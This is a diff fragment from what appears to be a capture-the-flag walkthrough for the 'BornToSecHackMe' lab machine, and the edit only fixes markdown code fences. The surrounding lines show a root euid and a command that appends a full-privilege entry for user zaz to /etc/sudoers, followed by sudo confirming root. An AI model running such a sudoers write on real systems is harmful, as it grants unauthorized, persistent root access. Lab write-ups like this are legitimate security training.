@@ -182,8 +182,8 @@ uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
 
 ```
 echo "zaz	ALL=(ALL:ALL) ALL" >> /etc/sudoers
-
-
+```
+```
 zaz@BornToSecHackMe:~$ sudo whoami
 root
 zaz@BornToSecHackMe:~$ sudo id
